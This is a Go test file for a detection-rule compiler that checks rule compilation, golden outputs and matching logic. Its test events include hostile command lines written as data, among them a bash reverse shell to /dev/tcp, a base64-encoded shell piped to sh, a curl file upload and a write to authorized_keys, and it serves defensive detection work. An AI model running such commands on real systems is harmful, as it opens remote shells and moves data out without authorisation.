package ruleast

import (
	"bytes"
	"encoding/json"
	"errors"
	"flag"
	"os"
	"path/filepath"
	"sort"
	"strings"
	"testing"
)

// updateGolden rewrites golden fixtures when set. Run with
// `go test -run Golden -update` to accept AST changes after touching the
// compiler — then inspect the diff before committing.
var updateGolden = flag.Bool("update", false, "rewrite golden files from current output")

func TestCompileGolden(t *testing.T) {
	rulesDir := "testdata/rules"
	goldenDir := "testdata/golden"

	entries, err := os.ReadDir(rulesDir)
	if err != nil {
		t.Fatalf("read rules dir: %v", err)
	}

	var ymls []string
	for _, e := range entries {
		if !e.IsDir() && strings.HasSuffix(e.Name(), ".yml") {
			ymls = append(ymls, e.Name())
		}
	}
	sort.Strings(ymls)
	if len(ymls) < 20 {
		t.Fatalf("expected >=20 rule fixtures; have %d", len(ymls))
	}

	for _, name := range ymls {
		name := name
		t.Run(name, func(t *testing.T) {
			src, err := os.ReadFile(filepath.Join(rulesDir, name))
			if err != nil {
				t.Fatalf("read rule: %v", err)
			}
			art, _, _, err := Compile(src)
			if err != nil {
				t.Fatalf("compile: %v", err)
			}
			got, err := json.MarshalIndent(ruleGolden(art.Rule), "", "  ")
			if err != nil {
				t.Fatalf("marshal: %v", err)
			}
			got = append(got, '\n')

			goldenPath := filepath.Join(goldenDir, strings.TrimSuffix(name, ".yml")+".json")
			if *updateGolden {
				if wErr := os.WriteFile(goldenPath, got, 0o600); wErr != nil {
					t.Fatalf("write golden: %v", wErr)
				}
				return
			}
			want, err := os.ReadFile(goldenPath)
			if err != nil {
				t.Fatalf("read golden (run with -update to create): %v", err)
			}
			if !bytes.Equal(got, want) {
				t.Errorf("golden mismatch for %s\n--- want\n%s\n--- got\n%s", name, want, got)
			}
		})
	}
}

func TestCompileRejectsInvalid(t *testing.T) {
	cases := []struct {
		file     string
		contains string
	}{
		{"bad-product.yml", "product"},
		{"bad-category.yml", "category"},
		{"bad-modifier.yml", "modifier"},
		{"missing-condition.yml", "condition"},
		{"unknown-selection.yml", "unknown selection"},
		{"timeframe.yml", "timeframe"},
		{"bad-regex.yml", "regex"},
		{"missing-id.yml", "id required"},
		{"empty-condition.yml", "end of condition"},
	}
	for _, c := range cases {
		c := c
		t.Run(c.file, func(t *testing.T) {
			src, err := os.ReadFile(filepath.Join("testdata", "invalid", c.file))
			if err != nil {
				t.Fatalf("read: %v", err)
			}
			_, _, _, err = Compile(src)
			if err == nil {
				t.Fatalf("expected error, got nil")
			}
			if !errors.Is(err, ErrCompile) {
				t.Errorf("error does not wrap ErrCompile: %v", err)
			}
			if !strings.Contains(err.Error(), c.contains) {
				t.Errorf("error %q does not contain %q", err.Error(), c.contains)
			}
		})
	}
}

// mapEnv is a small Env implementation backing Match tests with a literal
// map — avoids pulling an OCSF event into the pkg tests.
type mapEnv map[string][]string

func (m mapEnv) Lookup(field string) ([]string, bool) {
	v, ok := m[field]
	return v, ok
}

func TestMatchSimpleAnd(t *testing.T) {
	src, err := os.ReadFile("testdata/rules/01-reverse-shell-bash.yml")
	if err != nil {
		t.Fatal(err)
	}
	art, _, _, err := Compile(src)
	if err != nil {
		t.Fatalf("compile: %v", err)
	}
	rule := art.Rule

	hit := mapEnv{
		"Image":       {"/bin/bash"},
		"CommandLine": {"bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"},
	}
	if !rule.Match(hit) {
		t.Errorf("rule should match reverse-shell-style command")
	}

	miss := mapEnv{
		"Image":       {"/bin/ls"},
		"CommandLine": {"ls -la"},
	}
	if rule.Match(miss) {
		t.Errorf("rule should not match /bin/ls")
	}
}

func TestMatchNotOperator(t *testing.T) {
	src, err := os.ReadFile("testdata/rules/11-authorized-keys-write.yml")
	if err != nil {
		t.Fatal(err)
	}
	art, _, _, err := Compile(src)
	if err != nil {
		t.Fatal(err)
	}
	rule := art.Rule

	// sshd touching authorized_keys — benign branch, rule should NOT match.
	benign := mapEnv{
		"TargetFilename": {"/home/alice/.ssh/authorized_keys"},
		"Image":          {"/usr/sbin/sshd"},
	}
	if rule.Match(benign) {
		t.Errorf("sshd write should be filtered out by 'not benign'")
	}

	// Anything else touching the same file — should match.
	attacker := mapEnv{
		"TargetFilename": {"/home/alice/.ssh/authorized_keys"},
		"Image":          {"/tmp/payload"},
	}
	if !rule.Match(attacker) {
		t.Errorf("non-sshd writer should trigger")
	}
}

func TestMatchRegex(t *testing.T) {
	src, err := os.ReadFile("testdata/rules/22-regex-only.yml")
	if err != nil {
		t.Fatal(err)
	}
	art, _, _, err := Compile(src)
	if err != nil {
		t.Fatal(err)
	}
	rule := art.Rule
	if !rule.Match(mapEnv{"CommandLine": {"curl 1.2.3.4"}}) {
		t.Errorf("regex should match IP literal")
	}
	if rule.Match(mapEnv{"CommandLine": {"echo hello"}}) {
		t.Errorf("regex should not match plain text")
	}
}

func TestMatchNestedParens(t *testing.T) {
	src, err := os.ReadFile("testdata/rules/21-proc-nested-parens.yml")
	if err != nil {
		t.Fatal(err)
	}
	art, _, _, err := Compile(src)
	if err != nil {
		t.Fatal(err)
	}
	rule := art.Rule
	// (a AND (b OR c)) AND NOT d
	cases := []struct {
		env  mapEnv
		want bool
	}{
		{mapEnv{"Image": {"/bin/sh"}, "CommandLine": {"curl http://x"}, "User": {"alice"}}, true},
		{mapEnv{"Image": {"/bin/sh"}, "CommandLine": {"wget http://x"}, "User": {"alice"}}, true},
		{mapEnv{"Image": {"/bin/sh"}, "CommandLine": {"echo x"}, "User": {"alice"}}, false},
		{mapEnv{"Image": {"/bin/sh"}, "CommandLine": {"curl x"}, "User": {"root"}}, false},
		{mapEnv{"Image": {"/usr/bin/ls"}, "CommandLine": {"curl x"}, "User": {"alice"}}, false},
	}
	for i, c := range cases {
		if got := rule.Match(c.env); got != c.want {
			t.Errorf("case %d: got %v want %v (env=%v)", i, got, c.want, c.env)
		}
	}
}

func TestModifierAll(t *testing.T) {
	art, _, _, err := Compile(readRule(t, "testdata/rules/23-modifier-all.yml"))
	if err != nil {
		t.Fatal(err)
	}
	rule := art.Rule
	if !rule.Match(mapEnv{"CommandLine": {"./tool --upload --secret token"}}) {
		t.Errorf("|all should match when both substrings present")
	}
	if rule.Match(mapEnv{"CommandLine": {"./tool --upload only"}}) {
		t.Errorf("|all should not match when one value missing")
	}
}

func TestModifierCIDR(t *testing.T) {
	art, _, _, err := Compile(readRule(t, "testdata/rules/24-modifier-cidr.yml"))
	if err != nil {
		t.Fatal(err)
	}
	rule := art.Rule
	if !rule.Match(mapEnv{"DestinationIp": {"10.5.6.7"}}) {
		t.Errorf("|cidr should match address inside one of the prefixes")
	}
	if !rule.Match(mapEnv{"DestinationIp": {"192.168.1.1"}}) {
		t.Errorf("|cidr should match a second prefix")
	}
	if rule.Match(mapEnv{"DestinationIp": {"8.8.8.8"}}) {
		t.Errorf("|cidr should not match a public address")
	}
	if rule.Match(mapEnv{"DestinationIp": {"not-an-ip"}}) {
		t.Errorf("|cidr should not match a non-IP value")
	}
}

func TestModifierNull(t *testing.T) {
	art, _, _, err := Compile(readRule(t, "testdata/rules/25-modifier-null.yml"))
	if err != nil {
		t.Fatal(err)
	}
	rule := art.Rule
	if !rule.Match(mapEnv{"Image": {"/bin/sh"}}) {
		t.Errorf("|null should treat absent ParentImage as a positive match")
	}
	if rule.Match(mapEnv{"Image": {"/bin/sh"}, "ParentImage": {"/bin/bash"}}) {
		t.Errorf("|null should not match when field is present")
	}
}

func TestModifierBase64(t *testing.T) {
	art, _, _, err := Compile(readRule(t, "testdata/rules/26-modifier-base64.yml"))
	if err != nil {
		t.Fatal(err)
	}
	rule := art.Rule
	// "/bin/bash -i" base64 = L2Jpbi9iYXNoIC1p
	if !rule.Match(mapEnv{"CommandLine": {"echo L2Jpbi9iYXNoIC1p | base64 -d | sh"}}) {
		t.Errorf("|base64 should match the encoded form embedded in cmdline")
	}
	if rule.Match(mapEnv{"CommandLine": {"/bin/bash -i"}}) {
		t.Errorf("|base64 should not match the plaintext form")
	}
}

func TestModifierBase64Offset(t *testing.T) {
	art, _, _, err := Compile(readRule(t, "testdata/rules/27-modifier-base64offset.yml"))
	if err != nil {
		t.Fatal(err)
	}
	rule := art.Rule
	// base64("AKIA") = "QUtJQQ"; the offset 0 form should appear unaltered.
	if !rule.Match(mapEnv{"CommandLine": {"prefix QUtJQQ suffix"}}) {
		t.Errorf("|base64offset should match the offset-0 encoding")
	}
	if rule.Match(mapEnv{"CommandLine": {"AKIA in plain text"}}) {
		t.Errorf("|base64offset should not match the unencoded value")
	}
}

func TestModifierUTF16LE(t *testing.T) {
	art, _, _, err := Compile(readRule(t, "testdata/rules/28-modifier-utf16le.yml"))
	if err != nil {
		t.Fatal(err)
	}
	rule := art.Rule
	wide := encodeUTF16LE("powershell")
	if !rule.Match(mapEnv{"CommandLine": {"junk " + wide + " junk"}}) {
		t.Errorf("|utf16le should match the wide-encoded substring")
	}
	if rule.Match(mapEnv{"CommandLine": {"powershell"}}) {
		t.Errorf("|utf16le should not match the ASCII form")
	}
}

func TestListOfMapsSelection(t *testing.T) {
	art, _, _, err := Compile(readRule(t, "testdata/rules/29-list-of-maps.yml"))
	if err != nil {
		t.Fatal(err)
	}
	rule := art.Rule
	if !rule.Match(mapEnv{"Image": {"/bin/bash"}, "CommandLine": {"bash -i >& /dev/tcp/x/y"}}) {
		t.Errorf("first branch (bash + -i) should match")
	}
	if !rule.Match(mapEnv{"Image": {"/bin/sh"}, "CommandLine": {"sh -c 'curl x'"}}) {
		t.Errorf("second branch (sh + -c) should match")
	}
	if rule.Match(mapEnv{"Image": {"/bin/bash"}, "CommandLine": {"bash -c x"}}) {
		t.Errorf("partial cross-branch match should not fire")
	}
}

func TestQuantifier1Of(t *testing.T) {
	art, _, _, err := Compile(readRule(t, "testdata/rules/30-quantifier-1of.yml"))
	if err != nil {
		t.Fatal(err)
	}
	rule := art.Rule
	if !rule.Match(mapEnv{"Image": {"/bin/bash"}}) {
		t.Errorf("1 of sel_* should match when sel_b alone matches")
	}
	if !rule.Match(mapEnv{"Image": {"/bin/sh"}}) {
		t.Errorf("1 of sel_* should match when sel_a alone matches")
	}
	if rule.Match(mapEnv{"Image": {"/bin/zsh"}}) {
		t.Errorf("1 of sel_* should not match when neither selection matches")
	}
}

func TestQuantifierAllOfThem(t *testing.T) {
	art, _, _, err := Compile(readRule(t, "testdata/rules/31-quantifier-allofthem.yml"))
	if err != nil {
		t.Fatal(err)
	}
	rule := art.Rule
	all := mapEnv{
		"Image":       {"/usr/bin/curl"},
		"CommandLine": {"curl --upload-file foo http://example.com"},
	}
	if !rule.Match(all) {
		t.Errorf("all of them should match when every selection holds")
	}
	missing := mapEnv{
		"Image":       {"/usr/bin/curl"},
		"CommandLine": {"curl --upload-file foo"}, // no http
	}
	if rule.Match(missing) {
		t.Errorf("all of them should fail when one selection misses")
	}
}

func TestQuantifierNumeric(t *testing.T) {
	art, _, _, err := Compile(readRule(t, "testdata/rules/32-quantifier-numeric.yml"))
	if err != nil {
		t.Fatal(err)
	}
	rule := art.Rule
	// Two of four hints — meets threshold.
	if !rule.Match(mapEnv{"CommandLine": {"curl http://example.com"}}) {
		t.Errorf("2 of hint_* should match cmdline that hits hint_a + hint_b")
	}
	// Only one hint — below threshold.
	if rule.Match(mapEnv{"CommandLine": {"curl ftp://example.com"}}) {
		t.Errorf("2 of hint_* should not match a single-hit cmdline")
	}
	// Three of four — well above threshold.
	if !rule.Match(mapEnv{"CommandLine": {"curl --upload http://example.com"}}) {
		t.Errorf("2 of hint_* should match a three-hit cmdline")
	}
}

func TestCostOrdering(t *testing.T) {
	simpleArt, _, _, err := Compile(readRule(t, "testdata/rules/05-find-suid.yml"))
	if err != nil {
		t.Fatal(err)
	}
	complexArt, _, _, err := Compile(readRule(t, "testdata/rules/21-proc-nested-parens.yml"))
	if err != nil {
		t.Fatal(err)
	}
	simple := simpleArt.Rule
	complexRule := complexArt.Rule
	if simple.Cost() >= complexRule.Cost() {
		t.Errorf("simple rule cost %d should be less than complex rule cost %d", simple.Cost(), complexRule.Cost())
	}
}

func readRule(t *testing.T, path string) []byte {
	t.Helper()
	b, err := os.ReadFile(path)
	if err != nil {
		t.Fatal(err)
	}
	return b
}

// ruleGolden projects a *Rule into a stable map for golden comparison.
// Selections are emitted in sorted-key order so YAML-map nondeterminism
// can't perturb the output.
func ruleGolden(r *Rule) map[string]any {
	out := map[string]any{
		"id":          r.ID,
		"title":       r.Title,
		"description": r.Description,
		"level":       string(r.Level),
		"category":    string(r.Category),
		"cost":        r.Cost(),
		"condition":   r.Condition.String(),
	}
	if len(r.Tags) > 0 {
		tags := make([]string, len(r.Tags))
		copy(tags, r.Tags)
		sort.Strings(tags)
		out["tags"] = tags
	}

	names := make([]string, 0, len(r.Selections))
	for name := range r.Selections {
		names = append(names, name)
	}
	sort.Strings(names)

	sels := make([]any, 0, len(names))
	for _, name := range names {
		sel := r.Selections[name]
		branchesGolden := make([]any, 0, len(sel.Branches))
		for _, branch := range sel.Branches {
			fields := make([]any, 0, len(branch))
			for i := range branch {
				fp := branch[i]
				row := map[string]any{
					"field":  fp.Field,
					"op":     fp.Op.String(),
					"values": fp.Values,
				}
				if fp.Mods != 0 {
					row["mods"] = fp.Mods.String()
				}
				fields = append(fields, row)
			}
			sort.SliceStable(fields, func(i, j int) bool {
				a := fields[i].(map[string]any)
				b := fields[j].(map[string]any)
				if a["field"].(string) != b["field"].(string) {
					return a["field"].(string) < b["field"].(string)
				}
				return a["op"].(string) < b["op"].(string)
			})
			branchesGolden = append(branchesGolden, fields)
		}
		entry := map[string]any{"name": name}
		// Common case (single-branch selections) keeps the old "fields"
		// shape so existing 22 goldens stay byte-stable across this
		// refactor. List-of-maps selections render as "branches".
		if len(branchesGolden) == 1 {
			entry["fields"] = branchesGolden[0]
		} else {
			entry["branches"] = branchesGolden
		}
		sels = append(sels, entry)
	}
	out["selections"] = sels
	return out
}
